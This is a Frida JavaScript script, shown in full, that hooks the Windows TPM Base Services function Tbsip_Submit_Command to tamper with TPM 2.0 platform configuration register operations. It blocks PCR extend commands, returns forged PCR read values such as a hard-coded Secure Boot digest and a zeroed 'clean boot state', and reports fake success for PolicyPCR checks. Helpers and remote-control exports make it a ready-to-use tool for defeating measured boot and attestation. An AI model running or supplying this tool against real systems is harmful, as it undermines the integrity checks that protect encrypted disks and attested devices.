/**
 * TPM PCR Manipulator - Frida script for intercepting and modifying PCR operations
 *
 * Capabilities:
 * - Block PCR extend operations
 * - Spoof PCR read values
 * - Modify PCR policy checks
 * - Bypass measured boot integrity checks
 */

const TARGET_PCRS = {
    0: 'BIOS / Platform Configuration',
    1: 'BIOS Configuration',
    2: 'Option ROM Code',
    3: 'Option ROM Configuration',
    4: 'Master Boot Record',
    5: 'Boot Manager Code',
    6: 'Boot Manager Configuration',
    7: 'Secure Boot State',
    8: 'GRUB / Kernel Command Line',
    9: 'Kernel',
    10: 'IMA (Integrity Measurement Architecture)',
    11: 'BitLocker Access Control',
    12: 'Data Events',
    13: 'Boot Module Details',
    14: 'Machine Owner Keys',
    23: 'Application Support',
};

const spoofedPCRValues = {};
const blockedPCRs = new Set();
const pcrOperations = [];

function setSpoofedPCRValue(pcrIndex, value) {
    spoofedPCRValues[pcrIndex] = value;
    console.log(`[+] PCR${pcrIndex} spoofed value set: ${value.toString('hex').slice(0, 32)}...`);
}

function blockPCRExtend(pcrIndex) {
    blockedPCRs.add(pcrIndex);
    console.log(`[+] PCR${pcrIndex} extend operations will be blocked`);
}

function unblockPCRExtend(pcrIndex) {
    blockedPCRs.delete(pcrIndex);
    console.log(`[+] PCR${pcrIndex} extend operations unblocked`);
}

function parseTPMCommand(buffer) {
    if (buffer.length < 10) {
        return null;
    }

    const tag = buffer.readU16BE(0);
    const size = buffer.readU32BE(2);
    const commandCode = buffer.readU32BE(6);

    return {
        tag,
        size,
        commandCode,
        payload: buffer.slice(10),
    };
}

function createTPMResponse(responseCode, data) {
    const responseSize = 10 + (data ? data.length : 0);
    const buffer = Buffer.alloc(responseSize);

    buffer.writeUInt16BE(0x80_01, 0);
    buffer.writeUInt32BE(responseSize, 2);
    buffer.writeUInt32BE(responseCode, 6);

    if (data) {
        data.copy(buffer, 10);
    }

    return buffer;
}

function hookTbsipSubmitCommandForPCR() {
    const tbsDll = Process.findModuleByName('Tbs.dll');
    if (!tbsDll) {
        console.log('[-] Tbs.dll not loaded');
        return false;
    }

    const tbsipSubmitCommand = tbsDll.getExportByName('Tbsip_Submit_Command');
    if (!tbsipSubmitCommand) {
        console.log('[-] Tbsip_Submit_Command not found');
        return false;
    }

    Interceptor.attach(tbsipSubmitCommand, {
        onEnter(args) {
            this.commandBuffer = args[3];
            this.commandSize = args[4].toInt32();
            this.resultBuffer = args[5];
            this.resultSize = args[6];
            this.shouldModify = false;
            this.modifiedResponse = null;

            if (this.commandSize > 0 && this.commandSize < 65_536) {
                try {
                    const commandData = this.commandBuffer.readByteArray(this.commandSize);
                    const buffer = Buffer.from(commandData);
                    const parsed = parseTPMCommand(buffer);

                    if (!parsed) {
                        return;
                    }

                    switch (parsed.commandCode) {
                        case 0x00_00_01_82: {
                            console.log('[*] PCR_Extend detected');
                            if (parsed.payload.length >= 4) {
                                const pcrIndex = parsed.payload.readUInt32BE(0);
                                console.log(
                                    `    PCR Index: ${pcrIndex} (${TARGET_PCRS[pcrIndex] || 'Unknown'})`
                                );

                                if (blockedPCRs.has(pcrIndex)) {
                                    console.log(`[!] Blocking PCR${pcrIndex} extend operation`);
                                    this.shouldModify = true;
                                    this.modifiedResponse = createTPMResponse(0, null);

                                    pcrOperations.push({
                                        timestamp: Date.now(),
                                        operation: 'PCR_Extend',
                                        pcr: pcrIndex,
                                        blocked: true,
                                    });
                                }
                            }

                            break;
                        }
                        case 0x00_00_01_7E: {
                            console.log('[*] PCR_Read detected');

                            if (Object.keys(spoofedPCRValues).length > 0) {
                                const responseData = Buffer.alloc(4 + 32 * 24);
                                responseData.writeUInt32BE(24, 0);

                                for (let i = 0; i < 24; i++) {
                                    const offset = 4 + i * 32;
                                    if (spoofedPCRValues[i]) {
                                        spoofedPCRValues[i].copy(responseData, offset, 0, 32);
                                        console.log(
                                            `    Spoofing PCR${i}: ${spoofedPCRValues[i].toString('hex').slice(0, 16)}...`
                                        );
                                    } else {
                                        responseData.fill(0, offset, offset + 32);
                                    }
                                }

                                this.shouldModify = true;
                                this.modifiedResponse = createTPMResponse(0, responseData);

                                pcrOperations.push({
                                    timestamp: Date.now(),
                                    operation: 'PCR_Read',
                                    spoofed: true,
                                    pcrCount: Object.keys(spoofedPCRValues).length,
                                });
                            }

                            break;
                        }
                        case 0x00_00_01_7F: {
                            console.log('[*] PolicyPCR detected - PCR policy check');

                            if (Object.keys(spoofedPCRValues).length > 0) {
                                console.log('[!] Bypassing PCR policy check');
                                this.shouldModify = true;
                                this.modifiedResponse = createTPMResponse(0, null);

                                pcrOperations.push({
                                    timestamp: Date.now(),
                                    operation: 'PolicyPCR',
                                    bypassed: true,
                                });
                            }

                            break;
                        }
                        // No default
                    }
                } catch (error) {
                    console.log(`[-] Error in PCR hook: ${error.message}`);
                }
            }
        },

        onLeave(retval) {
            if (this.shouldModify && this.modifiedResponse) {
                try {
                    const responseSize = this.modifiedResponse.length;
                    this.resultBuffer.writeByteArray(this.modifiedResponse);
                    this.resultSize.writeU32(responseSize);
                    retval.replace(ptr(0));
                    console.log('[+] PCR operation modified successfully');
                } catch (error) {
                    console.log(`[-] Error modifying response: ${error.message}`);
                }
            }
        },
    });

    console.log('[+] Hooked Tbsip_Submit_Command for PCR manipulation');
    return true;
}

function spoofSecureBootPCR() {
    const secureBootEnabled = Buffer.from(
        'a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb',
        'hex'
    );
    setSpoofedPCRValue(7, secureBootEnabled);
}

function spoofCleanBootState() {
    for (let i = 0; i < 8; i++) {
        setSpoofedPCRValue(i, Buffer.alloc(32, 0));
    }
    console.log('[+] Clean boot state spoofed for PCRs 0-7');
}

function blockAllPCRExtends() {
    for (let i = 0; i < 24; i++) {
        blockedPCRs.add(i);
    }
    console.log('[+] All PCR extend operations blocked');
}

function getSummary() {
    return {
        spoofedPCRs: Object.keys(spoofedPCRValues).map(pcr => ({
            pcr: Number.parseInt(pcr, 10),
            name: TARGET_PCRS[Number.parseInt(pcr, 10)],
            value: `${spoofedPCRValues[pcr].toString('hex').slice(0, 32)}...`,
        })),
        blockedPCRs: [...blockedPCRs].map(pcr => ({
            pcr,
            name: TARGET_PCRS[pcr],
        })),
        operationCount: pcrOperations.length,
        recentOperations: pcrOperations.slice(-10),
    };
}

function initialize() {
    console.log('[*] TPM PCR Manipulator Initializing...');

    if (hookTbsipSubmitCommandForPCR()) {
        console.log('[+] PCR manipulation hooks installed');
    } else {
        console.log('[-] Failed to install PCR manipulation hooks');
    }

    console.log('[*] Available Commands:');
    console.log('    - setSpoofedPCRValue(index, buffer)');
    console.log('    - blockPCRExtend(index)');
    console.log('    - unblockPCRExtend(index)');
    console.log('    - spoofSecureBootPCR()');
    console.log('    - spoofCleanBootState()');
    console.log('    - blockAllPCRExtends()');
}

rpc.exports = {
    setSpoofedPCR: (pcrIndex, hexValue) => {
        const buffer = Buffer.from(hexValue, 'hex');
        if (buffer.length === 32) {
            setSpoofedPCRValue(pcrIndex, buffer);
            return { status: 'success', pcr: pcrIndex };
        }
        return { status: 'error', message: 'Value must be 32 bytes (64 hex chars)' };
    },
    blockPCR: pcrIndex => {
        blockPCRExtend(pcrIndex);
        return { status: 'success', pcr: pcrIndex };
    },
    unblockPCR: pcrIndex => {
        unblockPCRExtend(pcrIndex);
        return { status: 'success', pcr: pcrIndex };
    },
    spoofSecureBoot: () => {
        spoofSecureBootPCR();
        return { status: 'success' };
    },
    spoofCleanBoot: () => {
        spoofCleanBootState();
        return { status: 'success' };
    },
    blockAll: () => {
        blockAllPCRExtends();
        return { status: 'success' };
    },
    getSummary,
    getOperations: () => pcrOperations,
    clearOperations: () => {
        pcrOperations.length = 0;
        return { status: 'cleared' };
    },
};

setImmediate(initialize);
